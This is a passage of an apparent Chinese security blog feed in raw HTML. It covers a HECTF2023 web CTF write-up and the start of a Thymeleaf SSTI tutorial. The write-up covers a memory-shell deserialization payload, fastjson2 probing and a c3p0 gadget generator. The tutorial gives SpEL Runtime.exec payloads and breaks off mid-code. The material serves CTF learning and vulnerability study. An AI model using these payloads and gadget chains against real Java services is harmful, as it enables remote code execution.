class="hljs-number">1</span><span class="hljs-symbol">36 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">37 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">38 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">39 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">40 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">41 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">42 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">43 </span>= <span class="hljs-number">62</span><span class="hljs-symbol">44 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">45 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">46 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">47 </span>= <span class="hljs-number">63</span><span class="hljs-symbol">48 </span>= <span class="hljs-number">52</span><span class="hljs-symbol">49 </span>= <span class="hljs-number">53</span><span class="hljs-symbol">50 </span>= <span class="hljs-number">54</span><span class="hljs-symbol">51 </span>= <span class="hljs-number">55</span><span class="hljs-symbol">52 </span>= <span class="hljs-number">56</span><span class="hljs-symbol">53 </span>= <span class="hljs-number">57</span><span class="hljs-symbol">54 </span>= <span class="hljs-number">58</span><span class="hljs-symbol">55 </span>= <span class="hljs-number">59</span><span class="hljs-symbol">56 </span>= <span class="hljs-number">60</span><span class="hljs-symbol">57 </span>= <span class="hljs-number">61</span><span class="hljs-symbol">58 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">59 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">60 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">61 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">62 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">63 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">64 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">65 </span>= <span class="hljs-number">0</span><span class="hljs-symbol">66 </span>= <span class="hljs-number">1</span><span class="hljs-symbol">67 </span>= <span class="hljs-number">2</span><span class="hljs-symbol">68 </span>= <span class="hljs-number">3</span><span class="hljs-symbol">69 </span>= <span class="hljs-number">4</span><span class="hljs-symbol">70 </span>= <span class="hljs-number">5</span><span class="hljs-symbol">71 </span>= <span class="hljs-number">6</span><span class="hljs-symbol">72 </span>= <span class="hljs-number">7</span><span class="hljs-symbol">73 </span>= <span class="hljs-number">8</span><span class="hljs-symbol">74 </span>= <span class="hljs-number">9</span><span class="hljs-symbol">75 </span>= <span class="hljs-number">10</span><span class="hljs-symbol">76 </span>= <span class="hljs-number">11</span><span class="hljs-symbol">77 </span>= <span class="hljs-number">12</span><span class="hljs-symbol">78 </span>= <span class="hljs-number">13</span><span class="hljs-symbol">79 </span>= <span class="hljs-number">14</span><span class="hljs-symbol">80 </span>= <span class="hljs-number">15</span><span class="hljs-symbol">81 </span>= <span class="hljs-number">16</span><span class="hljs-symbol">82 </span>= <span class="hljs-number">17</span><span class="hljs-symbol">83 </span>= <span class="hljs-number">18</span><span class="hljs-symbol">84 </span>= <span class="hljs-number">19</span><span class="hljs-symbol">85 </span>= <span class="hljs-number">20</span><span class="hljs-symbol">86 </span>= <span class="hljs-number">21</span><span class="hljs-symbol">87 </span>= <span class="hljs-number">22</span><span class="hljs-symbol">88 </span>= <span class="hljs-number">23</span><span class="hljs-symbol">89 </span>= <span class="hljs-number">24</span><span class="hljs-symbol">90 </span>= <span class="hljs-number">25</span><span class="hljs-symbol">91 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">92 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">93 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">94 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">95 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">96 </span>= -<span class="hljs-number">1</span></code></pre></div><p>查了下<code>ascii</code>码表然后再对照<code>base64Alphabet</code>，我们可以填充以下字符来做为脏字符，但是需要注意有些字符并不能作为脏字符，比如说<code>[]</code>这种，会被HTTP包特殊识别。<code>&amp;</code>，<code>#</code>，<code>$</code>这种都是没问题的</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114231512510.png" alt="image-20240114231512510"></p><h3 id="打入内存马"><a href="#打入内存马" class="headerlink" title="打入内存马"></a>打入内存马</h3><p>使用CB链来打入spring内存马</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ip:port<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>25732<span class="language-clean">data=$$$$$$$$$$$rO0AB#############XNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1。。。</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ip:port<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">119</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Referer</span>: https://www.google.com/<span class="hljs-attribute">x</span>-client-data: cmd<span class="hljs-attribute">cmd</span>: cat ./flag</code></pre></div><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114232055735.png" alt="image-20240114232055735"></p><h2 id="FastjsonAttack"><a href="#FastjsonAttack" class="headerlink" title="FastjsonAttack"></a>FastjsonAttack</h2><p>考点：</p><p>黑盒测试：</p><ul><li>fastjson1，fastjson2的鉴别</li><li>parseObject 期望类</li><li>依赖探测</li></ul><p>但是因为太难，还是给出了附件</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115135252659.png" alt="image-20240115135252659"></p><p>抓包</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115135323995.png" alt="image-20240115135323995"></p><p>直接看出是个fastjson</p><h3 id="鉴别fastjson和fastjson2"><a href="#鉴别fastjson和fastjson2" class="headerlink" title="鉴别fastjson和fastjson2"></a>鉴别fastjson和fastjson2</h3><p>继续探测是<code>fastjson</code>，还是<code>fastjson2</code>，wp中给出了鉴别方法</p><p><code>fastjson2</code>不支持前面加逗号会报错但是支持后面加逗号，<code>fastjson1</code>支持前后加逗号</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115135610559.png" alt="image-20240115135610559"></p><h3 id="鉴别是否使用了期望类"><a href="#鉴别是否使用了期望类" class="headerlink" title="鉴别是否使用了期望类"></a>鉴别是否使用了期望类</h3><p>附件中的Student类可以看出friend使用了期望类</p><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;   <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;   <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> password;   <span class="hljs-keyword">private</span> <span class="hljs-title class_">Object</span> friend;  &#125;&#125;</code></pre></div><p>那如何来判断呢</p><p>如果我们把 <code>@type</code> 放在外边出现报错，而放在friend内部不报错的话则证明后端使用了期望类。</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-comment">//报错</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-comment">//不报错</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115135549854.png" alt="image-20240115135549854"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115135525143.png" alt="image-20240115135525143"></p><h3 id="Fastjson2探测某个依赖是否存在"><a href="#Fastjson2探测某个依赖是否存在" class="headerlink" title="Fastjson2探测某个依赖是否存在"></a>Fastjson2探测某个依赖是否存在</h3><p>判断依赖是否存在，fastjson2在类加载不到的情况下不会报出任何的错误，然后引用其内部的属性也不会报错。但是如果类存在，并且引入内部属性出错就会报错</p><p>简单来说不存在的类，怎么加载和调用它内部的属性都不会报错</p><p>存在的调用它内部属性出错时报错</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-comment">//不出错</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-comment">//出错</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;userOverridesAsString&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115141228712.png" alt="image-20240115141228712"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115141349061.png" alt="image-20240115141349061"></p><p>说明存在c3p0的依赖</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115141534387.png" alt="image-20240115141534387"></p><h3 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h3><p>那这么一说，比赛后期给了源码，就能直接看出fastjson2和c3p0</p><p>直接打c3p0的二次反序列化就行了</p><p>老样子，jackson别忘了去除<code>writeplace</code></p><div class="code-wrapper"><pre><code class="hljs reasonml">package jackson;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public <span class="hljs-keyword">class</span> c3p0_hex &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        byte<span class="hljs-literal">[]</span> bytecode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);        Templates templatesImpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123;<span class="hljs-params">bytecode</span>&#125;)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templatesImpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">templatesImpl</span>)</span>;        BadAttributeValueExpException exp = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;        Field <span class="hljs-keyword">val</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;        <span class="hljs-keyword">val</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">val</span>.set(exp,jsonNodes);        byte<span class="hljs-literal">[]</span> <span class="hljs-built_in">bytes</span> = serial(exp);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">ToHexString(<span class="hljs-params">bytes</span>, <span class="hljs-params">bytes</span>.<span class="hljs-params">length</span>)</span>);    &#125;    <span class="hljs-keyword">private</span> static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">field</span>, Object <span class="hljs-params">arg</span>)</span> throws Exception&#123;        Field f = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">field</span>)</span>;        f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        f.set(obj, arg);    &#125;    public static byte<span class="hljs-literal">[]</span> serial(Object data) throws Exception &#123;        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">barr</span>)</span>;        objectOutputStream.write<span class="hljs-constructor">Object(<span class="hljs-params">data</span>)</span>;        objectOutputStream.close<span class="hljs-literal">()</span>;        return barr.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>;    &#125;    public static String <span class="hljs-built_in">bytes</span><span class="hljs-constructor">ToHexString(<span class="hljs-params">byte</span>[] <span class="hljs-params">bArray</span>, <span class="hljs-params">int</span> <span class="hljs-params">length</span>)</span> &#123;        StringBuffer sb = <span class="hljs-keyword">new</span> <span class="hljs-constructor">StringBuffer(<span class="hljs-params">length</span>)</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;            String sTemp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Integer</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">HexString(255 &amp; <span class="hljs-params">bArray</span>[<span class="hljs-params">i</span>])</span>;            <span class="hljs-keyword">if</span> (sTemp.length<span class="hljs-literal">()</span> &lt; <span class="hljs-number">2</span>) &#123;                sb.append(<span class="hljs-number">0</span>);            &#125;            sb.append(sTemp.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span>);        &#125;        return sb.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;    &#125;&#125;</code></pre></div><p>内存马自己找找吧</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;friend&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;userOverridesAsString&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;HexAsciiSerializedMap:结果;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>运行的结果填入后，记得后面有个<code>;</code>别忘了</p><p>wp说回显要带内容，应该跟它使用的内存马有关，换个内存马就不用那些了</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240115145143004.png" alt="image-20240115145143004"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/7qL07hfmhkOhZ7An7acmxA">第七届HECTF信息安全挑战赛—WP—Web专场 (qq.com)</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2023/11/18/HECTF2023/">HECTF2023 | 雲流のLowest World (c1oudfl0w0.github.io)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>thymeleaf-ssti</title>
    <link href="/2024/01/12/thymeleaf-ssti/"/>
    <url>/2024/01/12/thymeleaf-ssti/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul><li>变量表达式： <code>$&#123;...&#125;</code></li><li>选择变量表达式： <code>*&#123;...&#125;</code></li><li>消息表达： <code>#&#123;...&#125;</code></li><li>链接 URL 表达式： <code>@&#123;...&#125;</code></li><li>片段表达式： <code>~&#123;...&#125;</code></li></ul><p>只要没有选定的对象，美元(<code>$&#123;…&#125;</code>)和星号(<code>*&#123;...&#125;</code>)的语法就完全一样</p><p><code>#&#123;&#125;</code>用来读取<strong>配置文件中的数据</strong>（通常是.properties文件）</p><p>片段表达式<code>~&#123;...&#125;</code>可以用于引用公共的目标片段，比如可以在一个<code>template/footer.html</code>中定义下面的片段,并在另一个template中引用。</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span></span><span class="language-xml">      © 2011 The Good Thymes Virtual Grocery</span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~</span></span></span><span class="hljs-template-variable">&#123;footer :: copy&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div><ol><li>**<del>{templatename::selector}**，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code>，如上面的&#96;</del>{footer :: copy}&#96;</li><li>**~{templatename}**，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li><li>**~{::selector} 或 ~{this::selector}**，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li></ol><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>语法：<code>__$&#123;expression&#125;__</code></p><p>官方文档对其的解释：</p><blockquote><p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有<em>预处理</em>表达式的功能。</p><p><strong>预处理是在正常表达式之前完成的表达式的执行</strong>，允许修改最终将执行的表达式。</p><p>预处理的表达式与普通表达式完全一样，但被双下划线符号（如<code>__$&#123;expression&#125;__</code>）包围。</p></blockquote><p><img src="/../images/thymeleaf-ssti/image-20240113210856432.png" alt="image-20240113210856432"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我这里使用<a href="https://github.com/veracode-research/spring-view-manipulation"> <strong>spring-view-manipulation</strong></a> 项目来做漏洞复现。</p><h3 id="templatename-（有返回值的情况）"><a href="#templatename-（有返回值的情况）" class="headerlink" title="templatename    （有返回值的情况）"></a>templatename    （有返回值的情况）</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/path&quot;</span>)<span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">path</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-built_in">String</span> lang</span>) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span>&#125;</code></pre></div><p>要有返回值的路由才能获取<code>ModelAndView</code>对象</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><div class="code-wrapper"><pre><code class="hljs xquery">_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22calc</span>.exe<span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span>.x</code></pre></div><p>事实上因为最后都会拼接<code>&quot;/welcome&quot;</code>，所以下面这样即可</p><div class="code-wrapper"><pre><code class="hljs xquery">_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22whoami</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__::</span></code></pre></div><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>当视图名中包含<code>::</code>会执行下面的代码。</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">fragmentExpression</span> = (FragmentExpression)parser.parseExpression(context, <span class="hljs-string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#125;&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><p>在<code>StandardExpressionParser#parseExpression</code>中会通过<code>preprocess</code>进行预处理，预处理根据该正则<code>\\_\\_(.*?)\\_\\_</code>提取<code>__xx__</code>间的内容，获取<code>expression</code>并执行<code>execute</code>方法。</p><p>最后通过SPEL执行表达式</p><p>所以<code>__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__</code>就没有问题，然后在语句前或后加上<code>::</code>即可</p><p>但这里要注意若是执行像<code>calc</code>这样的命令，<code>::</code>的位置确实是无关紧要，但若是要执行<code>whoami</code>这样有回显的命令的话，<code>::</code>必须要放在语句的后面，具体原因往下看</p><p>然后在<code>renderFragment</code>渲染的过程中，存在如下代码。</p><ul><li>当TemplateName中不包含<code>::</code>则将<code>viewTemplateName</code>赋值给<code>templateName</code>。</li><li>如果包含<code>::</code>则代表是一个片段表达式，则需要解析<code>templateName</code>和<code>markupSelectors</code>。</li></ul><p>当viewTemplateName为<code>welcome :: header</code>则会将welcome解析为<code>templateName</code>，将header解析为markupSelectors。</p><p>根据调试会知道最后会会显的是<code>templateName</code>，所以<code>::</code>必须要放在语句的后面</p><p><img src="/../images/thymeleaf-ssti/image-20240113215849440.png" alt="image-20240113215849440"></p><p><img src="/../images/thymeleaf-ssti/image-20240113215909731.png" alt="image-20240113215909731"></p><h3 id="0x02-selector"><a href="#0x02-selector" class="headerlink" title="0x02 selector"></a>0x02 selector</h3><p>Contorller ：可控点变为了selector位置</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/fragment&quot;)</span><span class="hljs-keyword">public</span> String <span class="hljs-title function_">fragment</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String section)</span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;welcome :: &quot;</span> + section; <span class="hljs-comment">//fragment is tainted</span>&#125;</code></pre></div><p>已经设置好了 ::的位置</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>若是calc的话直接即可，不需要<code>::</code>和<code>.</code></p><div class="code-wrapper"><pre><code class="hljs xquery">fragment?section=_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22calc</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__</span></code></pre></div><p>若是需要回显的话</p><p>要使用<code>.</code>或<code>/</code>结尾才能回显出报错页面看到结果</p><div class="code-wrapper"><pre><code class="hljs xquery">fragment?section=_<span class="hljs-number">_</span>$<span class="hljs-meta">%7bnew</span><span class="hljs-meta">%20java</span>.util.Scanner(T(java<span class="hljs-built_in">.lang</span>.Runtime).getRuntime().exec(<span class="hljs-meta">%22whoami</span><span class="hljs-meta">%22</span>).getInputStream()).<span class="hljs-keyword">next</span>()<span class="hljs-meta">%7d__</span>.</code></pre></div><h3 id="URI-PATH-（无返回值的情况）"><a href="#URI-PATH-（无返回值的情况）" class="headerlink" title="URI PATH   （无返回值的情况）"></a>URI PATH   （无返回值的情况）</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/doc/&#123;document&#125;&quot;</span>)public void <span class="hljs-built_in">getDocument</span>(<span class="hljs-variable">@PathVariable</span> String document) &#123;    <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>(<span 